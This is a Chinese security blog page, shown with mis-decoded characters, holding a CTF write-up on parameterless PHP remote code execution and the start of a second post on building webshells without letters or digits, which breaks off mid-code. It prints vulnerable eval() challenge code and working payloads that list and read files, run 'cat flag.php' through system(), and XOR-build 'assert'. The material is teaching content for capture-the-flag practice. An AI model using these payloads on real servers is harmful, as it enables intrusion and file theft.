                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">webå®‰å…¨</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h1><p>æ— å‚æ•°RCEæ–¹æ³•å°æ€»ç»“ï¼Œå¯ä»¥å‚è€ƒ</p>
<p><a class="foo" href="https://xz.aliyun.com/t/6737" target="_blank">ä»ä¸€é“CTFé¢˜å­¦ä¹ Fuzzæ€æƒ³</a></p>
<h1 id="æ— å‚æ•°RCEé¢˜ç›®"><a href="#æ— å‚æ•°RCEé¢˜ç›®" class="headerlink" title="æ— å‚æ•°RCEé¢˜ç›®"></a><strong>æ— å‚æ•°RCEé¢˜ç›®</strong></h1><h1 id="ä¾‹é¢˜ä¸€"><a href="#ä¾‹é¢˜ä¸€" class="headerlink" title="ä¾‹é¢˜ä¸€"></a><strong>ä¾‹é¢˜ä¸€</strong></h1><p>é¢˜ç›®æºç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®åˆ†æï¼š</p>
<p>å…¶ä¸­æ­£åˆ™é‡Œé¢çš„<code>\w</code>è¡¨ç¤º<code>a-z</code>ã€<code>A-Z</code>ã€<code>0-9</code>ï¼Œä»¥åŠä¸‹åˆ’çº¿ã€‚<code>(?R)</code>æ˜¯å¼•ç”¨å½“å‰è¡¨è¾¾å¼çš„æ„æ€ï¼Œå³å¯ä»¥ç”¨<code>\w+\((?R)?\)</code>æ›¿æ¢åˆ°<code>(?R)</code>çš„ä½ç½®ï¼Œ<code>(?R)?</code> è¿™é‡Œå¤šä¸€ä¸ª<code>?</code>è¡¨ç¤ºå¯ä»¥æœ‰å¼•ç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥è¡ç”ŸåŒ¹é…ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´<code>/[^\W]+\((?R)?\)/</code>ï¼ŒåªåŒ¹é…<code>å­—ç¬¦ä¸²+()</code>çš„ç±»å‹ï¼Œå¹¶ä¸”å¯ä»¥åµŒå¥—ä½¿ç”¨ã€‚</p>
<p>å¯ä»¥çœ‹ä¸€ä¸ªä¾‹å­</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$code1 = <span class="string">&quot;echo();&quot;</span>;</span><br><span class="line">$code2 = <span class="string">&quot;echo(123);&quot;</span>;</span><br><span class="line">$code3 = <span class="string">&quot;echo(phpinfo());&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $code1));</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $code2));</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $code3));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¾“å‡º</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">;</span><br><span class="line">echo(<span class="number">123</span>);</span><br><span class="line">;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬åˆ†åˆ«ä¼ å…¥äº†<code>echo();</code>ï¼Œ<code>echo(123)</code>å’Œ<code>echo(phpinfo())</code>ï¼Œå¯ä»¥çœ‹åˆ°å‚æ•°ä¸€æœ€ç»ˆæ›¿æ¢å‰©ä¸‹ä¸€ä¸ª<code>(;)</code>åˆ†å·ï¼Œè€Œå‚æ•°äºŒæ— æ³•åŒ¹é…æˆåŠŸæ›¿æ¢å¤±è´¥ï¼Œå‚æ•°ä¸‰æ˜¯echoåµŒå¥—ä¸€ä¸ªphpinfoå‡½æ•°ï¼ŒåŒæ ·åŒ¹é…æˆåŠŸæ›¿æ¢å‰©ä¸‹ä¸€ä¸ª<code>(;)</code>åˆ†å·ã€‚é‚£ä¹ˆè¿™é‡Œå°±è¯´æ˜äº†æˆ‘ä»¬è¿™ä¸ªæ­£åˆ™è™½ç„¶ä¸èƒ½èƒ½å¤ŸåŒ¹é…å­˜åœ¨å‚æ•°çš„å‡½æ•°ï¼Œä½†æ˜¯å¯ä»¥åµŒå¥—å‡½æ•°ä½¿ç”¨ã€‚</p>
<h3 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a><strong>æ–¹æ³•ä¸€</strong></h3><p>æˆ‘ä»¬çŸ¥é“<code>scandir()</code>å‡½æ•°å¼èƒ½å¤Ÿè¯»å–ç›®å½•æºç ï¼Œä½†æ˜¯ä»–å¿…é¡»å¸¦æœ‰å‚æ•°<code>ï¼ˆ&#39;.&#39;ï¼‰</code>ä¹Ÿå°±æ˜¯<code>scandir(&#39;.&#39;)</code>ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> var_dump(scandir(<span class="string">&#x27;.&#x27;</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ä¸Šé¢çš„æ­£åˆ™åŒ¹é…ä¸å…è®¸å‡ºç°å‡½æ•°é‡Œé¢æœ‰ç‚¹çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æƒ³åŠæ³•æ„é€ è¿™ä¸ªç‚¹ã€‚</p>
<p>åˆ©ç”¨<code>localeconv()</code> å–ç‚¹ï¼Œ<code>localeconv()</code> ä¼šè¿”å›å½“åœ°çš„é‡‘èä¿¡æ¯çš„æ•°ç»„ï¼Œè€Œç¬¬ä¸€ä¸ªå…ƒç´ å³ä¸ºç‚¹ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> var_dump(localeconv()); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ„é€ æ–¹æ³•åªéœ€å–ç¬¬ä¸€ä¸ªå…ƒç´ å³å¯ <code>pos()</code>ã€<code>current()</code> å‡å¯ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> var_dump(pos(localeconv())); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç»“åˆèµ·æ¥å°±æ˜¯</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> var_dump(scandir(pos(localeconv()))); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨endè¯»å–åä¸€ä¸ªæ–‡ä»¶åè¯»å–ï¬‚ag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> var_dump(end(scandir(pos(localeconv())))); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨readï¬leè¯»å–ï¬‚ag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> var_dump(readfile(end(scandir(pos(localeconv()))))); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆpayload</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.126.173:8080/code/code.php? code=var_dump(readfile(end(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

<h3 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a><strong>æ–¹æ³•äºŒ</strong></h3><p>åˆ©ç”¨å½“å‰ç§’æ•°æ„é€ ç‚¹  ï¼Œåˆ©ç”¨localtime()ä¸­è¿”å›çš„ç§’æ•°æ¥æ„é€ ç‚¹ï¼Œç‚¹çš„aiiscç æ­£å¥½æ˜¯46åœ¨60ç§’ä¹‹ å†…ï¼Œæˆ‘ä»¬åªéœ€ç­‰åˆ°46ç§’æ—¶å€™å°±èƒ½å°†ç‚¹ç»™æ„é€ å‡ºæ¥ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> var_dump(chr(pos(localtime()))); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆpayload</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.126.173:8080/code/code.php? code=var_dump(readfile(end(scandir(chr(pos(localtime()))))));</span><br></pre></td></tr></table></figure>

<h3 id="æ–¹æ³•ä¸‰"><a href="#æ–¹æ³•ä¸‰" class="headerlink" title="æ–¹æ³•ä¸‰"></a><strong>æ–¹æ³•ä¸‰</strong></h3><p>åˆ©ç”¨SESSIONIDæ¥ä¼ å‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.126.173:8080/code/code.php? code=show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure>

<p>åœ¨cookieå¤„è¾“å…¥</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHPSESSID=flag.php</span><br></pre></td></tr></table></figure>

<h3 id="æ–¹æ³•å››"><a href="#æ–¹æ³•å››" class="headerlink" title="æ–¹æ³•å››"></a><strong>æ–¹æ³•å››</strong></h3><p>åˆ©ç”¨ <code>getallheaders()</code> æ¥è·å–å‚æ•°RCEï¼Œè¿™é‡Œéœ€è¦ç”¨burpæŠ“åŒ…æ“ä½œã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.126.173:8080/code/code.php? code=echo(system(end(getallheaders()))); </span><br></pre></td></tr></table></figure>

<p>åœ¨æœ€ååœ¨æœ€åä¸€æ¡è¯·æ±‚å¤´æ·»åŠ </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.php</span><br></pre></td></tr></table></figure>

<h1 id="ä¾‹é¢˜äºŒ"><a href="#ä¾‹é¢˜äºŒ" class="headerlink" title="ä¾‹é¢˜äºŒ"></a><strong>ä¾‹é¢˜äºŒ</strong></h1><p>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒï¼Œæºç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ„é€ ç‚¹é—®é¢˜</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line">print_r(scandir(pos(localeconv())));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸¤ä¸ªéƒ½èƒ½ç”Ÿæˆç‚¹ã€‚</p>
<p>ä¼ å‚æ•°å‘ç°</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(5) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(4) &quot;.git&quot; [3]=&gt; string(8) &quot;flag.php&quot; [4]=&gt; string(9) &quot;index.php&quot; &#125; </span><br></pre></td></tr></table></figure>

<ul>
<li>exp1</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­array_reverseæ˜¯å°†æ•°ç»„å†…å®¹åè½¬ä¸€ä¸‹ï¼Œåˆ©ç”¨next()æŒ‡å‘flag.phpæ–‡ä»¶ã€‚</p>
<ul>
<li>exp2</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­array_flip()äº¤æ¢æ•°ç»„çš„é”®å’Œå€¼ï¼Œarray_rand()ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒ</p>
<p>å¤šåˆ·åˆ·å°±å‡ºflagã€‚</p>
<ul>
<li>exp3</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(session_id(session_start()));</span><br><span class="line">PHPSESSID=flag.php</span><br></pre></td></tr></table></figure>

<h1 id="è·³è½¬ç›®å½•æƒ…å†µ"><a href="#è·³è½¬ç›®å½•æƒ…å†µ" class="headerlink" title="è·³è½¬ç›®å½•æƒ…å†µ"></a><strong>è·³è½¬ç›®å½•æƒ…å†µ</strong></h1><ul>
<li><p>å‡è®¾ï¬‚agåœ¨ä¸Šå±‚ç›®å½•æ–‡ä»¶çš„æƒ…å†µï¼Œæˆ‘ä»¬éœ€è¦è·³è½¬åˆ°ä¸Šå±‚ç›®å½•ã€‚ </p>
</li>
<li><p><code>chdir()</code> å‡½æ•°å½“å‚æ•°ä¸ºä¸¤ä¸ªç‚¹çš„æ—¶å€™èƒ½å¤Ÿè·³è½¬åˆ°ä¸Šå±‚ç›®å½•ã€‚<code>scandir()</code> ï¼Œè¯»å–å½“å‰ç›®å½•åœ¨ç¬¬äºŒä¸ªå…ƒç´ å°±èƒ½è¯»å–ä¸¤ä¸ªç‚¹</p>
</li>
<li><p><code>localtime</code>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ—¶é—´æˆ³ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥åµŒå¥—ï¼Œéœ€è¦å¸¦ä¸€ä¸ªtimeå‡½æ•°ä½œä¸ºåµŒå¥—ã€timeå‡½æ•°èƒ½å¤Ÿè¿”å›æ—¶é—´æˆ³</p>
</li>
<li><p>æ„é€ è¯»å–ä¸Šå±‚ç›®å½•payload</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(implode(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))));</span><br></pre></td></tr></table></figure>

<ul>
<li>æ„é€ è¯»å–ä¸Šå±‚ç›®å½•æ–‡ä»¶payload</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br></pre></td></tr></table></figure>

<h1 id="å…¶ä»–å°æŠ€å·§"><a href="#å…¶ä»–å°æŠ€å·§" class="headerlink" title="å…¶ä»–å°æŠ€å·§"></a><strong>å…¶ä»–å°æŠ€å·§</strong></h1><p>åˆ©ç”¨ä¸‰è§’å‡½æ•°æ„é€ æ–œæ </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chr(floor(tan(tan(atan(atan(ord(cos(fclose(tmpfile())))))))));</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨éšæœºä»¤ç‰Œæ„é€ ç‚¹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(implode(scandir(chr(strrev(uniqid())))));</span><br></pre></td></tr></table></figure>

<h1 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a><strong>å°ç»“</strong></h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">getchwd() å‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚</span><br><span class="line">array_reverse() ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„</span><br><span class="line">scandir() å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚</span><br><span class="line">dirname() å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚</span><br><span class="line">chdir()   å‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚</span><br><span class="line">localeconv() è¿”å›å½“åœ°é‡‘èä¿¡æ¯ï¼Œå…¶ä¸­åŒ…å«äº†ç‚¹</span><br><span class="line">readfile() Â  è¾“å‡ºä¸€ä¸ªæ–‡ä»¶</span><br><span class="line">chr(pos(localtime())) åˆ©ç”¨å½“å‰ç§’æ•°æ„é€ ç‚¹ Â  Â </span><br><span class="line">current() Â  Â è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼</span><br><span class="line">pos() Â  Â  Â current() çš„åˆ«å</span><br><span class="line">next()     å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line">end() Â  Â  Â å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line">array_rand() Â  å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„éšæœºé”®åï¼Œæˆ–è€…å¦‚æœæ‚¨è§„å®šå‡½æ•°è¿”å›ä¸åªä¸€ä¸ªé”®åï¼Œåˆ™è¿”å›åŒ…å«éšæœº é”®åçš„æ•°ç»„ã€‚Â </span><br><span class="line">array_flip()   å‡½æ•°ç”¨äºåè½¬&#x2F;äº¤æ¢æ•°ç»„ä¸­æ‰€æœ‰çš„é”®åä»¥åŠå®ƒä»¬å…³è”çš„é”®å€¼ã€‚</span><br><span class="line">chr()  å‡½æ•°ä»æŒ‡å®šçš„ ASCII å€¼è¿”å›å­—ç¬¦ã€‚</span><br><span class="line">hex2bin()  è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</span><br><span class="line">getenv() Â  è·å–ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼(åœ¨7.1ä¹‹åå¯ä»¥ä¸ç»™äºˆå‚æ•°)</span><br><span class="line">show_source() é«˜äº®è¯»å–æ–‡ä»¶</span><br><span class="line">highlight_file() é«˜äº®è¯»å–æ–‡ä»¶</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.getflag.cn/2020/07/18/%E6%97%A0%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0webshell/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="http://yuhaojiang.gitee.io/picture/Blogå¤´åƒ.jpg">
      <meta itemprop="name" content="kawhi">
      <meta itemprop="description" content="æ²¡æœ‰æ³¢æ¶›ï¼Œå¦‚ä½•æ±¹æ¶Œ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kawhi">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/07/18/%E6%97%A0%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0webshell/" class="post-title-link" itemprop="url">æ— å­—ç¬¦æ„é€ webshell</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2020-07-18 00:00:00" itemprop="dateCreated datePublished" datetime="2020-07-18T00:00:00+08:00">2020-07-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-16 11:54:26" itemprop="dateModified" datetime="2020-10-16T11:54:26+08:00">2020-10-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">webå®‰å…¨</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h1><p>å­¦ä¹ ä¸€æ³¢å¥‡æ·«å·§è®¡ï¼Œæœ¬ç¯‡å¤§é‡å‚è€ƒäº†Pç¥ç¦»åˆ«æ­Œçš„æ–‡ç« ï¼š</p>
<p><a class="foo" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank">ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell</a></p>
<p><a class="foo" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank">æ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡</a></p>
<h1 id="æ— å­—ç¬¦ç»•è¿‡"><a href="#æ— å­—ç¬¦ç»•è¿‡" class="headerlink" title="æ— å­—ç¬¦ç»•è¿‡"></a><strong>æ— å­—ç¬¦ç»•è¿‡</strong></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,$_GET[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($_GET[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>æœ¬ç¯‡PHPç¯å¢ƒä¸º5.6</li>
</ul>
<h2 id="æ–¹æ³•ä¸€ï¼ˆå¼‚æˆ–ï¼‰"><a href="#æ–¹æ³•ä¸€ï¼ˆå¼‚æˆ–ï¼‰" class="headerlink" title="æ–¹æ³•ä¸€ï¼ˆå¼‚æˆ–ï¼‰"></a><strong>æ–¹æ³•ä¸€ï¼ˆå¼‚æˆ–ï¼‰</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>);</span><br><span class="line"><span class="comment">//è¾“å‡ºa</span></span><br></pre></td></tr></table></figure>

<p>ä»¥æ­¤ç±»æ¨ï¼Œæ„é€ webshell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%12&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%14&#x27;</span>^<span class="string">&#x27;`&#x27;</span>); <span class="comment">// $_=&#x27;assert&#x27;;</span></span><br><span class="line">$__=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span 